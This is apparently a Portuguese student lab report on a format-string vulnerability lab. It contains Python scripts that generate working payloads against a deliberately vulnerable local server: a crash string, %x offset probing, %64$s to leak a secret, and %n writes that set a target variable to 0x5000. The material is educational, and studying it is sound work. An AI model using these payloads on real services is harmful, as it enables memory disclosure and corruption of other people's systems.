# Trabalho realizado na Semana #6

Para todas as tarefas utilizámos o método de guardar o *input* num ficheiro e
fornecê-lo ao servidor usando:
```
$ cat <file> | nc 10.9.0.5 9090
```
Sendo `<file>` o nome do ficheiro usado, no nosso caso: `badfile`.


## Tarefa 1

Como o objetivo nesta tarefa é *crashar* o programa, pensamos em aceder a endereços
de memória inválidos usando a *format-string* que vamos fornecer como input.  

Para tal decidimos usar:
```
%s%s%s%s
```
de forma a usar números que estão na *stack* como endereços de memória e tentar ler
*strings* nesses endereços. A quantidade de `%s` foi arbitrária e caso não causasse *crash*
à primeira tentativa, bastaria adicionar mais `%s` até um dos valores ser um endereço
inválido.  

*Program crash*:  
![/imgs6/crash.png](/imgs6/crash.png)

(Nota: não foi *printed* `(ˆ_ˆ)(ˆ_ˆ) Returned properly (ˆ_ˆ)(ˆ_ˆ)`, o que indica que
o programa efetivamente *crashou*)


## Tarefa 2.A

Para obter o número de `%x` *format specifiers* para o programa dar *print* dos primeiros
4 *bytes* de input bastou fazer vários testes usando o seguinte *script* de *python*
para ajudar a gerar o *badfile*:

```py
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

NUM = 64
fmt = ("AAAA" + "-%x"*NUM).encode('latin-1')

content[0:len(fmt)] = fmt

with open('badfile', 'wb') as f:
    f.write(content)
```

Decidimos usar `AAAA` como os primeiros 4 *bytes* de *input* sendo a sua codificação
em hexadecimal = `0x41414141`.  

`NUM` representa a quantidade de `%x` necessários.  
Inicialmente usámos 100:

```py
NUM = 100
```

E obtivémos o seguinte resultado no *server*:  
![/imgs6/x100.png](/imgs6/x100.png)

Aqui vimos que o `41414141` se encontrava já *printed* e foi só uma questão de acertar
o `NUM` até chegar ao `64`:  
![/imgs6/x64.png](/imgs6/x64.png)

```py
NUM = 64
```


## Tarefa 2.B

O objetivo é dar *print* de uma variável global do tipo *string*.
Para tal, é necessário:

1. Saber o endereço onde se encontra.
2. Colocar na stack o valor do endereço do ponto 1.
3. Aceder ao endereço e dar `print` da string aí encontrada.

O ponto `1.` é dado pelo *printout* do *server*:  
![/imgs6/secret_message_address.png](/imgs6/secret_message_address.png)

O ponto `2.` é efetuado fornecendo o endereço como *input* ao programa dado que
esse *input* é guardado num *buffer*.  

O ponto `3.` é feito fazendo *exploit* da vulnerabilidade detetada no `printf()`.

Assim, usámos de novo um *script* de *python* para gerar o `badfile` que vai servir como *input*:

```py
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

address = 0x080b4008
content[0:4] = (address).to_bytes(4, byteorder='little')

fmt = ("%64$s").encode('latin-1')
content[4:len(fmt)] = fmt

with open('badfile', 'wb') as f:
    f.write(content)
```

De notar que estamos a guardar o endereço `0x080b4008` no início e após isso usámos
o *format-specifier* `%64$s` de modo a dar print à *string* do suposto argumento 64 da 
`printf()`. (64 foi o número encontrado na [Tarefa 2.A](#tarefa-2a) e que, usado desta forma,
faz com que seja usado o endereço dado nos primeiros 4 *bytes* do *input* como endereço da *string*
que se pretende dar *print*)

*Printout* do *server* onde é possível ver o conteúdo da *secret-message*:  
![/imgs6/secret_message.png](/imgs6/secret_message.png)


## Tarefa 3.A

Nesta tarefa o objetivo não é ler, mas escrever. Para tal, usando a mesma vulnerabilidade,
o *exploit* terá que ser feito usando o *format-specifier* `%n`.

Mais uma vez, primeiro é necessário saber o endereço onde se pretende escrever:  
![/imgs6/target_variable_address.png](/imgs6/target_variable_address.png)

Após isto, usámos novamente um *script* de *python* para gerar o *input*:

```py
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

address = 0x080e5068
content[0:4] = (address).to_bytes(4, byteorder='little')

fmt = ("%64$n").encode('latin-1')
content[4:len(fmt)] = fmt

with open('badfile', 'wb') as f:
    f.write(content)
```

Assim, foi colocado no início do *input* o endereço do *target* e de seguida foi passado o
*format-specifier* `%n` modificado (`%64$n`) para selecionar o 64.º suposto argumento de `printf()`,
que vai coincidir na *stack* com o início do nosso *input* guardado no *buffer* e que será usado como
endereço para guardar o número de caracteres escritos pelo `printf()` até ao momento.

*Printout* do *server* onde é possível ver que o *value* do *target* foi alterado:  
![/imgs6/target_variable_change.png](/imgs6/target_variable_change.png)


## Tarefa 3.B

A diferença desta tarefa para a anterior foi apenas na quantidade de caracteres aos quais
tivemos de dar print antes de usar o *format-specifier* `%n`.

Uma vez que é para alterar o *target* para `0x5000 = 20480`, e dado que
já são escritos 4 *bytes* devido ao endereço, torna-se necessário dar *print* a
mais `20480 - 4 = 20476` caracteres.

Uma vez mais, utilizamos um *script* de *python* para gerar o *input*:

```py
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

address = 0x080e5068
content[0:4] = (address).to_bytes(4, byteorder='little')

fmt = ("%20476x%64$n").encode('latin-1')
content[4:len(fmt)] = fmt

with open('badfile', 'wb') as f:
    f.write(content)
```

A única diferença relativamente ao *script* da [Tarefa 3.A](#tarefa-3a) foi
a adição de `%20476x` antes do *format-specifier* que guarda a quantidade de caracteres
aos quais se deu *print*, de modo a imprimir um suposto 1.º argumento do `printf()` em
formato hexadecimal em `20476` caracteres com *leading spaces*.

*Printout* do *server* onde é possível ver que o *value* do *target* foi alterado para `0x5000`:  
![/imgs6/target_variable_change_0x5000.png](/imgs6/target_variable_change_0x5000.png)

De notar que foi efetivamente *printed* uma quantidade enorme de espaços seguida de um
valor hexadecimal de 4 *bytes*.


## CTF

### Desafio 1

### Desafio 2

























